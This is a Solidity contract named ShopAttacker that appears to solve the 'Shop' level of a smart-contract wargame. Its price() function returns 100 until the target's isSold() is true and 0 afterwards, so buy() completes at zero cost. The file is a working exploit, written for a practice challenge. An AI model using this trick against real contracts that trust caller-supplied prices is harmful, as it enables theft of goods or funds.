// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Shop} from "../contracts/21_Shop.sol";

contract ShopAttacker {
    Shop private shop;

    constructor(address _shopAddress) {
        shop = Shop(_shopAddress);
    }

    function attack() external {
        shop.buy();
    }

    function price() external view returns (uint256) {
        if (shop.isSold()) {
            return 0;
        }

        return 100;
    }
}
